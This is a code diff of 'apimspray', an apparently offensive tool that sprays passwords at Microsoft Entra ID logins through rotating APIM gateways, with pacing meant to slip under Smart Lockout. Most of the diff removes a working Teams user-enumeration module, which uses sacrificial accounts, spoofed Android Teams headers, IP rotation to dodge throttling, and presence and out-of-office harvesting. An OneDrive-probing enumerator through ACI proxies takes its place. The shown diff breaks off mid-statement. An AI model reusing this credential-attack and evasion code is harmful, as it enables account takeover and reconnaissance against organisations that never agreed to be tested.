@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 apimspray - Entra ID Auth Assessment Toolkit via APIM Gateways
-Enhanced with Microsoft Teams user enumeration (inspired by TeamFiltration)
+Enhanced with OneDrive-based passive user enumeration
 """
 
 import argparse
@@ -14,8 +14,6 @@ import threading
 import json
 import re
 import requests
-import itertools
-import queue
 import subprocess
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -49,22 +47,6 @@ PACE_SETTINGS = {
     "stealth": {"workers": 1, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
 }
 
-# Enumerate pacing (separate from spray — enum is read-only, no lockout risk)
-# Teams API throttles per token. Each token gets dedicated worker threads with
-# an IntervalTimer for fixed-rate spacing. Add more sacrificial accounts to scale.
-TEAMS_ENUM_RATE_PER_TOKEN = 2.0  # base req/s per IP; auto-scaled by proxy count
-
-# rate_per_ip = max req/s to send through each proxy IP
-# Teams tolerates ~2-3 req/s per source IP. Total throughput is computed at
-# runtime: rate_per_ip × num_proxies / num_tokens → per-token rate.
-# threads_per_token scales with rate to overlap HTTP latency.
-ENUM_PACE_SETTINGS = {
-    "high":    {"rate_per_ip": 2.5, "threads_per_token_per_ip": 1},
-    "medium":  {"rate_per_ip": 1.5, "threads_per_token_per_ip": 1},
-    "mid":     {"rate_per_ip": 1.5, "threads_per_token_per_ip": 1},
-    "low":     {"rate_per_ip": 0.8, "threads_per_token_per_ip": 1},
-    "stealth": {"rate_per_ip": 0.3, "threads_per_token_per_ip": 1},
-}
 
 # Smart Lockout
 LOCKOUT_WAIT_SECONDS = 65
@@ -106,24 +88,6 @@ CLIENT_APPS = [
     }
 ]
 
-# Teams-specific client config for sacrificial account auth
-TEAMS_CLIENT_CONFIG = {
-    "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
-    "resource": "https://api.spaces.skype.com/",
-    "scope": "openid profile"
-}
-
-# Teams API regions
-TEAMS_REGIONS = ["amer", "emea", "apac"]
-DEFAULT_TEAMS_REGION = "amer"
-
-# Teams client headers (mimics Android Teams app, same as TeamFiltration)
-TEAMS_CLIENT_HEADERS = {
-    "x-ms-client-caller": "x-ms-client-caller",
-    "x-ms-client-version": "27/1.0.0.2021011237",
-    "Referer": "https://teams.microsoft.com/_",
-    "ClientInfo": "os=Android; osVer=7.1.2; proc=x86; lcid=en-US; deviceType=2; country=US; clientName=microsoftteams; clientVer=1416/1.0.0.2021012201; utcOffset=+01:00"
-}
 
 # AADSTS Codes
 AADSTS_REGEX = re.compile(r'(AADSTS\d+)')
@@ -165,78 +129,6 @@ class APIMManager:
         with self.lock:
             if not self.urls:
                 raise ValueError("No APIM URLs available.")
-            if len(self.urls) == 1:
-                return self.urls[0]
-            if not self._pool:
-                self._pool = list(self.urls)
-                random.shuffle(self._pool)
-                if self._last_url and self._pool[0] == self._last_url and len(self._pool) > 1:
-                    self._pool[0], self._pool[1] = self._pool[1], self._pool[0]
-            next_url = self._pool.pop(0)
-            self._last_url = next_url
-            return next_url
-
-class IntervalTimer:
-    """
-    Ensures requests are spaced at least `interval` seconds apart.
-    Multiple threads share one timer per token.
-    """
-    __slots__ = ("interval", "_next_slot", "_lock")
-
-    def __init__(self, rate):
-        self.interval = 1.0 / rate
-        self._next_slot = time.monotonic()
-        self._lock = threading.Lock()
-
-    def wait(self):
-        """Block until the next rate-limit slot is available."""
-        with self._lock:
-            now = time.monotonic()
-            if now < self._next_slot:
-                wait_time = self._next_slot - now
-                self._next_slot += self.interval
-            else:
-                wait_time = 0
-                self._next_slot = now + self.interval
-        if wait_time > 0:
-            time.sleep(wait_time)
-
-    @property
-    def current_rate(self):
-        return 1.0 / self.interval
-
-
-class _SacToken:
-    """
-    Holds auth state for a single sacrificial account:
-    bearer token, skype token, credentials (for re-auth), and a per-token
-    IntervalTimer for rate spacing.
-    """
-    __slots__ = ("bearer", "skype", "username", "password", "timer",
-                 "reauth_lock")
-
-    def __init__(self, bearer, skype, username, password="", rate=None):
-        self.bearer = bearer
-        self.skype = skype
-        self.username = username
-        self.password = password
-        self.timer = IntervalTimer(rate or TEAMS_ENUM_RATE_PER_TOKEN)
-        self.reauth_lock = threading.Lock()
-
-
-class TeamsAPIMManager:
-    """Manages APIM URLs specifically configured for Teams API proxying."""
-    def __init__(self, urls):
-        self.urls = urls
-        self.lock = threading.Lock()
-        self._pool = []
-        self._last_url = None
-
-    def get_next_url(self):
-        """Returns the next Teams APIM URL, cycling through a shuffled pool."""
-        with self.lock:
-            if not self.urls:
-                raise ValueError("No Teams APIM URLs available.")
             if len(self.urls) == 1:
                 return self.urls[0]
             if not self._pool:
@@ -541,536 +433,6 @@ def build_file_message(target, aadsts, classification, gateway_url):
     return f"{target.username}:{target.password} | {aadsts_display} | {classification} | APIM: {gateway_host}"
 
 
-# ============================================================================
-# TEAMS ENUMERATION VIA APIM (ported from TeamFiltration)
-# ============================================================================
-
-class TeamsEnumerator:
-    """
-    Enumerates valid Microsoft Teams users by leveraging a sacrificial O365 account.
-    Routes all API traffic through APIM gateways for IP rotation.
-
-    Flow:
-      1. Authenticate sacrificial account via APIM -> get Teams bearer token
-      2. Exchange bearer token for Skype token via authsvc.teams.microsoft.com
-      3. For each candidate email, hit the Teams externalsearchv3 endpoint
-         (routed through Teams APIM gateways) to determine if the user exists
-      4. Optionally fetch user presence/out-of-office info
-    """
-
-    def __init__(self, login_apim_manager, teams_apim_manager, region=DEFAULT_TEAMS_REGION):
-        self.login_apim_manager = login_apim_manager
-        self.teams_apim_manager = teams_apim_manager
-        self.region = region
-        # Legacy single-token fields (kept for backward compat / re-auth fallback)
-        self.bearer_token = None
-        self.skype_token = None
-        self._lock = threading.Lock()
-        self._reauth_lock = threading.Lock()
-        self._sac_user = None
-        self._sac_pass = None
-        self._tenant = "common"
-        # Multi-token pool — each _SacToken has its own IntervalTimer
-        self._token_pool = []          # list[_SacToken]
-        self._pool_lock = threading.Lock()
-        self._pending_bearer = None
-        # Shared session with large connection pool for TCP reuse
-        adapter = requests.adapters.HTTPAdapter(
-            pool_connections=50,
-            pool_maxsize=300,
-            max_retries=0,
-        )
-        self._session = requests.Session()
-        self._session.mount("https://", adapter)
-        self._session.mount("http://", adapter)
-
-    def _build_enum_url(self, email):
-        """Build the Teams externalsearchv3 URL for a candidate email."""
-        if self.teams_apim_manager:
-            gw = self.teams_apim_manager.get_next_url()
-            if not gw.endswith("/"):
-                gw += "/"
-            return f"{gw}{self.region}/beta/users/{email}/externalsearchv3", urlparse(gw).netloc
-        else:
-            return f"https://teams.microsoft.com/api/mt/{self.region}/beta/users/{email}/externalsearchv3", "direct"
-
-    def _build_headers_for_token(self, token_entry):
-        """Build Teams API headers scoped to a specific sacrificial token."""
-        headers = self._get_base_headers()
-        if token_entry.bearer:
-            headers["Authorization"] = f"Bearer {token_entry.bearer}"
-        if token_entry.skype:
-            headers["Authentication"] = f"skypetoken={token_entry.skype}"
-            headers["X-Skypetoken"] = token_entry.skype
-        return headers
-
-    def _get_base_headers(self):
-        """Construct base headers mimicking the Teams Android client."""
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        }
-        headers.update(TEAMS_CLIENT_HEADERS)
-        return headers
-
-    def _get_auth_headers(self):
-        """Construct headers with bearer + skype tokens for Teams API calls."""
-        headers = self._get_base_headers()
-        if self.bearer_token:
-            headers["Authorization"] = f"Bearer {self.bearer_token}"
-        if self.skype_token:
-            headers["Authentication"] = f"skypetoken={self.skype_token}"
-            headers["X-Skypetoken"] = self.skype_token
-        return headers
-
-    def authenticate_sacrificial(self, username, password, tenant="common"):
-        """
-        Authenticate the sacrificial account through APIM to get a Teams bearer token.
-        Uses the Teams client_id targeting the Skype API resource.
-        """
-        # Store for mid-run re-authentication
-        self._sac_user = username
-        self._sac_pass = password
-        self._tenant = tenant
-
-        # Route through APIM if available, otherwise go direct
-        if self.login_apim_manager:
-            gateway_url = self.login_apim_manager.get_next_url()
-            if not gateway_url.endswith("/"):
-                gateway_url += "/"
-            full_url = f"{gateway_url}common/oauth2/token"
-        else:
-            full_url = "https://login.microsoftonline.com/common/oauth2/token"
-
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Accept": "application/json",
-            "client-request-id": str(uuid.uuid4()),
-            "return-client-request-id": "true"
-        }
-
-        data = {
-            "grant_type": "password",
-            "resource": TEAMS_CLIENT_CONFIG["resource"],
-            "client_id": TEAMS_CLIENT_CONFIG["client_id"],
-            "scope": TEAMS_CLIENT_CONFIG["scope"],
-            "username": username,
-            "password": password,
-        }
-
-        try:
-            resp = self._session.post(full_url, headers=headers, data=data, timeout=30, verify=True)
-            if resp.status_code == 200:
-                token_data = resp.json()
-                if "access_token" in token_data:
-                    self.bearer_token = token_data["access_token"]
-                    print_success("Sacrificial account authenticated via APIM -- Teams bearer token acquired")
-                    # Remove old entry now; new entry is added by acquire_skype_token()
-                    # once both bearer + skype are ready (avoids race where threads
-                    # pick up an entry with skype=None and get 401).
-                    with self._pool_lock:
-                        self._token_pool = [e for e in self._token_pool if e.username != username]
-                    self._pending_bearer = (self.bearer_token, username, password)
-                    return True
-                else:
-                    print_error(f"Auth response missing access_token: {resp.text[:200]}")
-                    return False
-            else:
-                aadsts = parse_aadsts(resp.text)
-                status = get_status_from_aadsts(aadsts) if aadsts else f"HTTP {resp.status_code}"
-                print_error(f"Sacrificial account auth failed: {status}")
-                if aadsts:
-                    print_error(f"AADSTS Code: {aadsts}")
-                return False
-        except requests.RequestException as e:
-            print_error(f"Sacrificial account auth request failed: {e}")
-            return False
-
-    def acquire_skype_token(self):
-        """
-        Exchange the Teams bearer token for a Skype token.
-        This call goes DIRECTLY to authsvc.teams.microsoft.com (no APIM needed;
-        this is a one-time call that does not reveal target info).
-        """
-        if not self.bearer_token:
-            print_error("No bearer token available -- authenticate first")
-            return False
-
-        url = "https://authsvc.teams.microsoft.com/v1.0/authz"
-        headers = self._get_base_headers()
-        headers["Authorization"] = f"Bearer {self.bearer_token}"
-
-        try:
-            resp = self._session.post(url, headers=headers, json={}, timeout=30, verify=True)
-            if resp.status_code == 200:
-                data = resp.json()
-                skype_token = data.get("tokens", {}).get("skypeToken")
-                if skype_token:
-                    self.skype_token = skype_token
-                    # Add the fully-ready token to the pool (bearer + skype).
-                    # authenticate_sacrificial() removed the old entry and stashed
-                    # the pending bearer — now we insert the complete entry atomically.
-                    pending = getattr(self, "_pending_bearer", None)
-                    with self._pool_lock:
-                        if pending and pending[0] == self.bearer_token:
-                            self._token_pool.append(
-                                _SacToken(self.bearer_token, skype_token, pending[1], pending[2], rate=TEAMS_ENUM_RATE_PER_TOKEN)
-                            )
-                            self._pending_bearer = None
-                        else:
-                            # Fallback: update existing entry in-place
-                            for entry in self._token_pool:
-                                if entry.bearer == self.bearer_token:
-                                    entry.skype = skype_token
-                                    break
-                    region_hint = data.get("region", "").lower()
-                    if region_hint in TEAMS_REGIONS:
-                        self.region = region_hint
-                        print_info(f"Teams region detected: {style(self.region.upper(), TermColors.MAGENTA, TermColors.BOLD)}")
-                    print_success("Skype token acquired")
-                    return True
-                else:
-                    print_error("Skype token not found in authz response")
-                    return False
-            else:
-                print_error(f"Skype token acquisition failed: HTTP {resp.status_code}")
-                try:
-                    err_data = resp.json()
-                    print_error(f"Error: {err_data.get('message', resp.text[:200])}")
-                except Exception:
-                    print_error(f"Response: {resp.text[:200]}")
-                return False
-        except requests.RequestException as e:
-            print_error(f"Skype token request failed: {e}")
-            return False
-
-    def _make_enum_request(self, email, token_entry):
-        """
-        Make a single enumeration request with a specific token.
-        Returns a result dict. No retries, no rate limiting — caller handles that.
-        """
-        result = {
-            "email": email, "valid": False, "object_id": None,
-            "display_name": None, "upn": None, "tenant_id": None,
-            "mri": None, "gateway": None, "error": None,
-            "token_expired": False, "retry_after": 0,
-        }
-
-        url, gw_host = self._build_enum_url(email)
-        result["gateway"] = gw_host
-        headers = self._build_headers_for_token(token_entry)
-
-        try:
-            resp = self._session.get(url, headers=headers, timeout=10, verify=True)
-        except requests.RequestException as e:
-            result["error"] = str(e)
-            return result
-
-        if resp.status_code == 401:
-            resp_text = resp.text[:300] if resp.text else ""
-            if "Access denied" in resp_text or "subscription" in resp_text.lower():
-                result["error"] = f"APIM gateway error: {resp_text[:150]}"
-            else:
-                result["error"] = "HTTP 401"
-                result["token_expired"] = True
-            return result
-
-        if resp.status_code == 429:
-            result["error"] = "HTTP 429"
-            result["retry_after"] = min(int(resp.headers.get("Retry-After", 2)), 30)
-            return result
-
-        if resp.status_code == 200:
-            body = resp.text
-            if "tenantId" in body:
-                try:
-                    users_found = resp.json()
-                    if isinstance(users_found, list) and len(users_found) > 0:
-                        for user_obj in users_found:
-                            tenant_id = user_obj.get("tenantId")
-                            coex_mode = (user_obj.get("featureSettings") or {}).get("coExistenceMode", "")
-                            display_name = user_obj.get("displayName", "")
-                            upn = user_obj.get("userPrincipalName", "")
-
-                            if tenant_id:
-                                result["valid"] = True
-                                result["object_id"] = user_obj.get("objectId")
-                                result["display_name"] = display_name
-                                result["upn"] = upn
-                                result["tenant_id"] = tenant_id
-                                result["mri"] = user_obj.get("mri")
-                                break
-                except (ValueError, KeyError):
-                    pass
-            return result
-
-        if resp.status_code == 403:
-            try:
-                err_body = resp.json()
-                if err_body.get("errorCode") == "Forbidden":
-                    result["valid"] = True
-                    result["tenant_id"] = "forbidden-enum"
-            except (ValueError, KeyError):
-                pass
-            if not result["valid"]:
-                result["error"] = f"HTTP 403: {resp.text[:150]}"
-            return result
-
-        result["error"] = f"HTTP {resp.status_code}: {resp.text[:150]}"
-        return result
-
-    def _reauth_token(self, token_entry):
-        """
-        Re-authenticate a specific token. Uses global _reauth_lock to avoid
-        concurrent writes to instance auth state.
-        Returns True on success.
-        """
-        with self._reauth_lock:
-            ok = self.authenticate_sacrificial(
-                token_entry.username, token_entry.password, self._tenant
-            )
-            if not ok:
-                return False
-            new_bearer = self.bearer_token
-            ok = self.acquire_skype_token()
-            if not ok:
-                return False
-            new_skype = self.skype_token
-            token_entry.bearer = new_bearer
-            token_entry.skype = new_skype
-            return True
-
-    def _token_worker(self, token_entry, user_queue, results_lock,
-                      valid_users_set, valid_mris, counters, counters_lock,
-                      logger, progress, stop_event):
-        """
-        Dedicated worker thread for a single token. Pulls users from the
-        shared queue, makes enumeration requests at the token's rate.
-
-        On 429: sleeps Retry-After seconds then re-queues the user.
-        With IP diversity, 429s are rare and simple retry is sufficient.
-        """
-        MAX_REQUEUE = 3
-        reauth_failures = 0
-
-        while not stop_event.is_set():
-            try:
-                item = user_queue.get(timeout=2)
-            except queue.Empty:
-                break  # queue drained
-
-            if isinstance(item, tuple):
-                email, attempt = item
-            else:
-                email, attempt = item, 0
-
-            if stop_event.is_set():
-                user_queue.task_done()
-                return
-
-            token_entry.timer.wait()
-            result = self._make_enum_request(email, token_entry)
-
-            # Success — process result, recover rate
-            if result.get("error") is None:
-                reauth_failures = 0
-
-                with counters_lock:
-                    counters["completed"] += 1
-                    counters["checked"] += 1
-
-                if result["valid"]:
-                    with results_lock:
-                        valid_users_set.add(email)
-                        if result.get("mri"):
-                            valid_mris[email] = result["mri"]
-
-                    display = result.get("display_name", "")
-                    suffix = f" ({display})" if display else ""
-                    print(f"{style('[+]', TermColors.GREEN, TermColors.BOLD)} "
-                          f"{style(email, TermColors.GREEN, TermColors.BOLD)}{suffix}")
-                    sys.stdout.flush()
-
-                    logger.log_result("enumerated", email)
-                    logger.log_enum_detail({
-                        "timestamp": utc_now_str(),
-                        "email": email,
-                        "valid": True,
-                        "object_id": result.get("object_id"),
-                        "tenant_id": result.get("tenant_id"),
-                        "mri": result.get("mri"),
-                    })
-
-                progress.increment()
-                user_queue.task_done()
-                continue
-
-            # 429 — sleep Retry-After, then re-queue
-            if "429" in str(result["error"]):
-                with counters_lock:
-                    counters["rate_limited"] += 1
-                    rl = counters["rate_limited"]
-                if rl == 1 or rl % 25 == 0:
-                    print_warn(f"429 x{rl} [{token_entry.username}]")
-                    sys.stdout.flush()
-
-                retry_after = result.get("retry_after", 2)
-                time.sleep(retry_after)
-
-                if attempt < MAX_REQUEUE:
-                    user_queue.put((email, attempt + 1))
-                else:
-                    with counters_lock:
-                        counters["completed"] += 1
-                        counters["errors"] += 1
-                    progress.increment()
-                user_queue.task_done()
-                continue
-
-            # 401 — re-auth and re-queue
-            if result.get("token_expired"):
-                if reauth_failures >= 3:
-                    print_error(f"Token {token_entry.username} failed 3 consecutive "
-                                "re-auths — thread exiting")
-                    user_queue.put((email, attempt))
-                    user_queue.task_done()
-                    return
-                stale = token_entry.bearer
-                print_warn(f"Token expired for {token_entry.username} — re-authenticating...")
-                if self._reauth_token(token_entry):
-                    reauth_failures = 0
-                else:
-                    reauth_failures += 1
-                user_queue.put((email, attempt))
-                user_queue.task_done()
-                continue
-
-            # Connection error / APIM error — re-queue
-            if attempt < MAX_REQUEUE:
-                user_queue.put((email, attempt + 1))
-            else:
-                with counters_lock:
-                    counters["completed"] += 1
-                    counters["errors"] += 1
-                progress.increment()
-            user_queue.task_done()
-
-    def verify_token(self, username=None):
-        """
-        Verify a token works by making a test enumeration request.
-        Retries up to 3 times with different gateways on connection errors.
-        """
-        with self._pool_lock:
-            if username:
-                entry = next((e for e in self._token_pool if e.username == username), None)
-            else:
-                entry = self._token_pool[0] if self._token_pool else None
-        if not entry:
-            print_error("No token entry found to verify")
-            return False
-        if not entry.skype:
-            print_error(f"Token for {entry.username} has no Skype token")
-            return False
-
-        for attempt in range(3):
-            test_email = f"apimspray.tokencheck.{random.randint(10000,99999)}@outlook.com"
-            entry.timer.wait()
-            result = self._make_enum_request(test_email, entry)
-
-            if result.get("error") is None:
-                print_success(f"Token verified for {entry.username} (HTTP 200)")
-                return True
-            elif result.get("token_expired"):
-                print_error(f"Token REJECTED for {entry.username} (HTTP 401)")
-                return False
-            elif "429" in str(result.get("error", "")):
-                print_warn(f"Token rate-limited during verification (HTTP 429) — likely valid")
-                return True
-            else:
-                print_warn(f"Verify attempt {attempt + 1}/3 failed: {result['error']}")
-                if attempt < 2:
-                    continue
-                print_error(f"Token verification failed after 3 attempts for {entry.username}")
-                return False
-        return False
-
-    def _fetch_presence(self, mri):
-        """
-        Fetch user presence and out-of-office status.
-        Goes directly to presence.teams.microsoft.com (not proxied;
-        this only reveals the MRI, not the candidate list).
-        """
-        if not mri:
-            return None
-
-        headers = self._get_auth_headers()
-        headers["Content-Type"] = "application/json"
-        url = "https://presence.teams.microsoft.com/v1/presence/getpresence/"
-        payload = [{"mri": mri}]
-
-        try:
-            resp = self._session.post(url, headers=headers, json=payload, timeout=10, verify=True)
-            if resp.status_code == 200:
-                data = resp.json()
-                if isinstance(data, list) and len(data) > 0:
-                    presence_obj = data[0].get("presence", {})
-                    cal_data = presence_obj.get("calendarData", {})
-                    ooo_note = cal_data.get("outOfOfficeNote", {})
-                    return {
-                        "message": ooo_note.get("message") if ooo_note else None,
-                        "availability": presence_obj.get("availability"),
-                    }
-        except Exception:
-            pass
-        return None
-
-    def sanity_check(self, sample_domain):
-        """
-        Verify enumeration works by checking a guaranteed-invalid username.
-        Returns True if sanity check PASSES (enumeration is usable).
-        """
-        first_names = ["james","mary","john","patricia","robert","jennifer","michael","linda","david","elizabeth"]
-        last_names = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
-        fake_first = random.choice(first_names)
-        fake_last = random.choice(last_names)
-        fake_num = random.randint(10000, 99999)
-        fake_user = f"{fake_first}.{fake_last}{fake_num}@{sample_domain}"
-        print_info(f"Running sanity check with: {fake_user}")
-
-        token_entry = self._token_pool[0] if self._token_pool else None
-        if not token_entry:
-            print_error("No tokens available for sanity check")
-            return False
-
-        for attempt in range(3):
-            token_entry.timer.wait()
-            result = self._make_enum_request(fake_user, token_entry)
-
-            if result.get("token_expired"):
-                print_error("Sanity check got 401 -- token may be invalid for Teams API.")
-                return False
-
-            if result.get("error"):
-                if attempt < 2:
-                    print_warn(f"Sanity check attempt {attempt + 1} returned: {result['error']} -- retrying in 3s...")
-                    time.sleep(3)
-                    continue
-                else:
-                    print_warn(f"Sanity check returned error after 3 attempts: {result['error']}")
-                    print_warn("Gateways may be under pressure -- expect higher retry rates")
-                    return True
-
-            if result["valid"]:
-                print_error("Sanity check FAILED -- fake user returned as valid. Enumeration unreliable for this tenant.")
-                return False
-            else:
-                print_success("Sanity check PASSED -- enumeration is viable for this tenant")
-                return True
-
-        return True
-
 
 # ============================================================================
 # CORE AUTH LOGIC (unchanged from original)
@@ -1200,14 +562,10 @@ def process_attempt(
 
 def main():
     parser = argparse.ArgumentParser(
-        description="apimspray - Entra ID Assessment Tool (with Teams Enumeration)",
+        description="apimspray - Entra ID Assessment Tool (with OneDrive Enumeration)",
         formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument("--urls", required=False, help="Path to APIM URLs file (login gateways, from apimcreate.py)")
-    parser.add_argument("--teams-urls", required=False, help=(
-        "Path to Teams APIM URLs file (teams gateways, from apimcreate.py --type teams).\n"
-        "If not provided in enumerate mode, Teams API calls go direct (no IP rotation for enum)."
-    ))
     parser.add_argument("--users", help="Path to users file")
     parser.add_argument("--passwords", help="Path to passwords file")
     parser.add_argument("--output", default="results", help="Output directory")
@@ -1221,10 +579,8 @@ def main():
             "Operation mode:\n"
             " - spray:      Test all passwords against all users (1:N) via APIM.\n"
             " - validate:   Perform 1:1 credential pair testing via APIM.\n"
-            " - enumerate:  Enumerate valid users via Microsoft Teams external search\n"
-            "               using a sacrificial O365 account. Auth traffic is routed\n"
-            "               through login APIM gateways. Teams API traffic is routed\n"
-            "               through Teams APIM gateways (--teams-urls) if provided."
+            " - enumerate:  Enumerate valid users via OneDrive URL probing (passive, no login).\n"
+            "               Route through ACI proxies (--aci-urls) for multi-IP throughput."
         ),
     )
     parser.add_argument(
@@ -1244,24 +600,11 @@ def main():
     parser.add_argument("--verbose", action="store_true", help="Enable on-demand progress output (press Enter to see progress).")
 
     # Enumerate-specific arguments
-    parser.add_argument("--sac-user", help="Sacrificial O365 username for Teams enumeration")
-    parser.add_argument("--sac-pass", help="Sacrificial O365 password for Teams enumeration")
     parser.add_argument(
-        "--sac-accounts",
-        help=(
-            "Path to file with additional sacrificial accounts (one user:pass per line).\n"
-            "Each account gets its own token and rate limiter — adds ~45 req/s per account.\n"
-            "Combined with --sac-user/--sac-pass or used standalone."
-        ),
+        "--aci-urls",
+        help="Path to ACI proxy URLs file for enumeration (from onedrive_proxy.py).\n"
+             "Each proxy URL gets one dedicated thread. More proxies = higher throughput."
     )
-    parser.add_argument(
-        "--teams-region",
-        default=DEFAULT_TEAMS_REGION,
-        choices=TEAMS_REGIONS,
-        help=f"Teams API region hint (default: {DEFAULT_TEAMS_REGION}). Auto-detected after auth when possible.",
-    )
-    parser.add_argument("--no-presence", action="store_true", help="Skip presence/out-of-office fetching during enumeration (faster).")
-    parser.add_argument("--skip-sanity", action="store_true", help="Skip the pre-enumeration sanity check.")
 
     args = parser.parse_args()
 
@@ -1436,33 +779,13 @@ def main():
 
 
 def _run_enumerate(args):
-    """Execute Teams-based user enumeration through APIM gateways."""
-    if not args.sac_user and not getattr(args, "sac_accounts", None):
-        print_error("Enumerate mode requires --sac-user/--sac-pass or --sac-accounts")
-        sys.exit(1)
+    """Execute OneDrive-based user enumeration."""
+    from onedrive_enum import OneDriveEnumerator, build_onedrive_path
+    from onedrive_proxy import derive_sharepoint_host
+
     if not args.users:
         print_error("Enumerate mode requires --users (file of candidate email addresses)")
         sys.exit(1)
-
-    login_apim = None
-    if args.urls and Path(args.urls).exists():
-        login_urls = load_file_lines(args.urls)
-        if login_urls:
-            login_apim = APIMManager(login_urls)
-            print_info(f"Login APIM gateways: {style(str(len(login_urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
-    if not login_apim:
-        print_info("No --urls provided -- sacrificial auth will go direct to login.microsoftonline.com")
-
-    teams_apim = None
-    if args.teams_urls and Path(args.teams_urls).exists():
-        teams_urls = load_file_lines(args.teams_urls)
-        if teams_urls:
-            teams_apim = TeamsAPIMManager(teams_urls)
-            print_info(f"Teams APIM gateways: {style(str(len(teams_urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
-        else:
-            print_warn("Teams URLs file is empty -- Teams API calls will go direct")
-    else:
-        print_warn("No --teams-urls provided -- Teams API calls will go direct (no IP rotation for enum)")
 
     users = load_file_lines(args.users)
     users = normalize_users(users, args.domain)
@@ -1473,212 +796,46 @@ def _run_enumerate(args):
         random.shuffle(users)
         print_info(f"User list randomized ({len(users)} users shuffled)")
 
+    try:
+        tenant_name = derive_sharepoint_host(args.tenant, args.domain).split("-my.")[0]
+    except ValueError as e:
+        print_error(str(e))
+        sys.exit(1)
+
+    proxy_urls = []
+    if getattr(args, "aci_urls", None) and Path(args.aci_urls).exists():
+        proxy_urls = load_file_lines(args.aci_urls)
+
     logger = Logger(args.output)
 
-    # Collect all sacrificial accounts
-    sac_accounts = []
-    if args.sac_user and args.sac_pass:
-        sac_accounts.append((args.sac_user, args.sac_pass))
-    if getattr(args, "sac_accounts", None) and Path(args.sac_accounts).exists():
-        for line in load_file_lines(args.sac_accounts):
-            if ":" in line:
-                u, p = line.split(":", 1)
-                sac_accounts.append((u.strip(), p.strip()))
-    if not sac_accounts:
-        print_error("No sacrificial accounts provided. Use --sac-user/--sac-pass or --sac-accounts.")
-        sys.exit(1)
-
     print_info(f"Starting apimspray")
-    print_info(f"Mode: {style('enumerate', TermColors.MAGENTA, TermColors.BOLD)} (Teams User Enumeration)")
-    print_info(f"Sacrificial Accounts: {style(str(len(sac_accounts)), TermColors.CYAN, TermColors.BOLD)}")
+    print_info(f"Mode: {style('enumerate', TermColors.MAGENTA, TermColors.BOLD)} (OneDrive User Enumeration)")
+    print_info(f"Tenant: {style(tenant_name, TermColors.CYAN, TermColors.BOLD)}")
     print_info(f"Candidate Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
-    print_info(f"Sacrificial Auth: {style('via APIM' if login_apim else 'direct', TermColors.MAGENTA, TermColors.BOLD)}")
-    enum_pace = ENUM_PACE_SETTINGS[args.pace]
-    # Compute rate based on number of proxy IPs and tokens
-    num_proxies = len(teams_apim.urls) if teams_apim else 1
-    num_tokens = len(sac_accounts)  # approximate; actual count known after auth
-    rate_per_ip = enum_pace["rate_per_ip"]
-    pace_rate = max(1.0, (rate_per_ip * num_proxies) / max(num_tokens, 1))
-    threads_per_token = max(1, int(enum_pace["threads_per_token_per_ip"] * num_proxies / max(num_tokens, 1)))
-    # Store computed values for later use
-    enum_pace = {"rate": pace_rate, "threads_per_token": threads_per_token}
-    total_rate = pace_rate * num_tokens
-    print_info(f"Pace: {style(args.pace, TermColors.MAGENTA, TermColors.BOLD)}, "
-               f"Rate: {style(f'~{pace_rate:.1f} req/s per token', TermColors.MAGENTA, TermColors.BOLD)} "
-               f"({num_proxies} proxies × {rate_per_ip} req/s/ip ÷ {num_tokens} tokens = ~{total_rate:.0f} req/s total)")
-    if not args.no_presence:
-        print_info(f"Presence/OOO Fetch: {style('ENABLED (post-enum pass)', TermColors.GREEN, TermColors.BOLD)}")
+    if proxy_urls:
+        print_info(f"ACI Proxies: {style(str(len(proxy_urls)), TermColors.MAGENTA, TermColors.BOLD)} (one thread per IP)")
     else:
-        print_info(f"Presence/OOO Fetch: {style('DISABLED', TermColors.YELLOW, TermColors.BOLD)}")
+        print_info("No --aci-urls provided — enumeration going direct (single thread)")
 
-    enumerator = TeamsEnumerator(login_apim, teams_apim, region=args.teams_region)
+    enumerator = OneDriveEnumerator(proxy_urls)
+    valid_users, counters = enumerator.enumerate(users, tenant_name, logger)
 
-    # Authenticate all sacrificial accounts and build the token pool
-    for sac_user, sac_pass in sac_accounts:
-        print_info(f"Authenticating: {style(sac_user, TermColors.CYAN)}")
-        if not enumerator.authenticate_sacrificial(sac_user, sac_pass, args.tenant):
-            print_warn(f"Failed to authenticate {sac_user} — skipping")
-            continue
-        if not enumerator.acquire_skype_token():
-            print_warn(f"Failed to acquire Skype token for {sac_user} — skipping")
-            continue
+    _print_enum_summary(logger, valid_users, users, counters)
 
-    token_count = len(enumerator._token_pool)
-    if token_count == 0:
-        print_error("No sacrificial accounts authenticated successfully.")
-        sys.exit(1)
 
-    # Verify each token actually works against the Teams search API
-    print_info("Verifying token(s) against Teams API...")
-    failed_usernames = []
-    for entry in list(enumerator._token_pool):
-        if not enumerator.verify_token(entry.username):
-            failed_usernames.append(entry.username)
-    if failed_usernames:
-        with enumerator._pool_lock:
-            enumerator._token_pool = [e for e in enumerator._token_pool if e.username not in failed_usernames]
-        token_count = len(enumerator._token_pool)
-        if token_count == 0:
-            print_error("All tokens failed verification — check that sacrificial accounts have Teams licenses.")
-            sys.exit(1)
-        print_warn(f"Removed {len(failed_usernames)} broken token(s), {token_count} remain")
-
-    # Recalculate rate with actual token count (some may have failed auth)
-    if token_count != num_tokens:
-        num_proxies_actual = len(teams_apim.urls) if teams_apim else 1
-        pace_rate = max(1.0, (rate_per_ip * num_proxies_actual) / max(token_count, 1))
-        threads_per_token = max(1, int(num_proxies_actual / max(token_count, 1)))
-        enum_pace = {"rate": pace_rate, "threads_per_token": threads_per_token}
-    effective_rate = token_count * enum_pace["rate"]
-    print_success(f"Token pool ready: {style(str(token_count), TermColors.GREEN, TermColors.BOLD)} token(s) — effective rate ~{effective_rate:.0f} req/s")
-
-    if not args.skip_sanity:
-        sample_domain = users[0].split("@")[1] if "@" in users[0] else args.domain
-        if sample_domain:
-            if not enumerator.sanity_check(sample_domain):
